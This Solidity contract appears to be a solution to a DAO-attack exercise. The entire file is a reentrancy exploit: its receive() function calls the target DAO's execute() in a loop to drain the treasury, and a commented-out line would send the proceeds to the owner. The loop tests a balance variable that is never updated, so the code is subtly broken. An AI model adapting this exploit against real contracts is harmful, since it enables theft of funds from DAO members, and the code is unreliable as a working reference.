// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.20;

import "@openzeppelin/contracts/access/Ownable.sol";

import {TheGridDAO} from "../dao-attack-2/TheGridDAO.sol";
import {console, Test} from "forge-std/Test.sol";

contract AttactDAO is Ownable, Test {
    TheGridDAO dao;

    constructor(address _contractAddress) Ownable(msg.sender) {
        dao = TheGridDAO(_contractAddress);
    }

    receive() external payable {
        uint256 daobalance = address(dao.treasury()).balance;

        while (daobalance != 100 ether) {
            dao.execute(3);
        }
        console.log(daobalance);

        // (bool success, ) = address(owner()).call{value: address(this).balance}("");
        // if (!success) revert("Transaction Failed");
    }
}
